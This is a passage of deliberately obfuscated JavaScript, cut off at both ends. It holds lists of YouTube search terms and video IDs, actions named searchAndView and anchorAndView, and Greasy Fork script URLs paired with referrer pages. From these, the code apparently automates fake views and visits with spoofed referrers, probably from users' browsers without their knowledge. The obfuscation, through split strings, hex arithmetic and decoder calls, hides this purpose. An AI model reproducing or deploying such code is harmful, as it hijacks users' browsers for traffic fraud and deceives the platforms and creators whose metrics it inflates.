'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x2607 + -0xa * 0x266 + -0xef * 0xf)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x61 * -0x4d + 0xb * 0x373 + -0x8ba)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + X(0x0) + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x17d1 * -0x1 + 0xd * -0x22c + 0x3f * 0x12);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    Y(0x4) + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    Z(0x13, 'FXD(') + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    Y(0x14) + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    Z(0x12, '9BhA') + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    Y(0xc) + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x1a) + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': Y(0x1) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + Y(0x6) + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
